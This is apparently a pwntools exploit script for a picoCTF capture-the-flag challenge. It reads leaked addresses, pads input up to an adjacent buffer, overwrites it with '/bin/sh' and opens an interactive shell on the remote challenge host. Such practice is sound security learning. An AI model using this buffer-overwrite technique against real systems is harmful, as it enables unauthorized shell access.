
from pwn import *

pr = remote('saffron-estate.picoctf.net',51669 )

# pr = process('./vuln')
elf = ELF('./vuln')

pr.recvuntil(b'username at ')
usrName_addr = int(pr.recvline(), 16)
log.info(f'Username address: {hex(usrName_addr)}')

pr.recvuntil(b'shell at ')
shell_addr = int(pr.recvline(), 16)
log.info(f'Shell address: {hex(shell_addr)}')

offset = shell_addr - usrName_addr
print('Offset:', offset)

payload = b'a' * offset 
payload += b'/bin/sh\x00'

# gdb.attach(pr, gdbscript='''
#            b*0x0000000000401279
#            c
#            ''')

pr.sendlineafter(b'username: ', payload)

pr.interactive()